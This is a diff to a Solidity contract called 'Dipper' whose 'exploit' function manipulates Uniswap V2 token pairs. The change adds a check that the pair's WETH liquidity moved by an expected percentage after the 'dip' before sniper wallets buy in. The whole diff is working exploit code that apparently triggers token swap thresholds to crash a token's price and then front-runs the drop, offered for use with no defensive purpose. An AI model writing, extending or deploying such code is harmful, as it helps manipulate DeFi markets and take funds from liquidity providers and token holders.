@@ -12,6 +12,8 @@ contract Dipper {
         IUniswapV2Router02(address(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D));
     IUniswapV2Factory private extFactory =
         IUniswapV2Factory(address(0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f));
+    IERC20 private wETH =
+        IERC20(address(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2));
 
     struct SniperWallet {
         address addr;
@@ -39,6 +41,7 @@ contract Dipper {
 
     function exploit(
         uint8 maxRounds,
+        uint256 expectedLpVariationAfterDip,
         uint256 maxEthSpentOnExploit,
         uint256 minEthLiquidity,
         uint256 swapThresholdTokens,
@@ -54,6 +57,8 @@ contract Dipper {
         uint8 mode = getDipperMode(path, swapThresholdTokens);
         require(mode != 0, "Could not identify");
 
+        uint256 wethLpBeforeDip = wETH.balanceOf(pair);
+
         if (mode == 1) {
             _exploit_m1_m6(path, 0, maxRounds);
         }
@@ -67,6 +72,19 @@ contract Dipper {
                 maxRounds
             );
         }
+
+        uint256 wethLpAfterDip = wETH.balanceOf(pair);
+        uint256 wethLpVariationPercentage = ((
+            wethLpAfterDip > wethLpBeforeDip
+                ? wethLpAfterDip - wethLpBeforeDip
+                : wethLpBeforeDip - wethLpAfterDip
+        ) * 10000) / wethLpBeforeDip;
+
+        // console.log("WETHLPBeforeDip: ", wethLpBeforeDip);
+        // console.log("WETHLPAfterDip: ", wethLpAfterDip);
+        // console.log("wethLpVariationPercentage: ", wethLpVariationPercentage);
+
+        require(wethLpVariationPercentage >= expectedLpVariationAfterDip, "A little more affection was expected, tbh");
 
         _buyTokenBySniperWallets(path, sniperWallets, sniper_max_failed_swaps);
 
